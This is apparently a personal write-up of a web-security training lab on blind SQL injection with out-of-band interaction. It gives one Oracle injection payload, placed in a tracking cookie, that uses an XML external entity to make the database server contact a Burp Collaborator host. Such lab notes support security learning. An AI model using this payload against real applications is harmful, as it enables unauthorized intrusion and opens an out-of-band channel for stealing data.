
### Lab description


This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to cause a DNS lookup to Burp Collaborator.

### hint

> You cant use other services **only** the burp collaborator public service.


### Lab solution

![](/static/img/Pasted_image_20230605114828.png)

- Payload: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://aaaaa.oastify.com/"> %remote;]>'),'/l') FROM dual--`
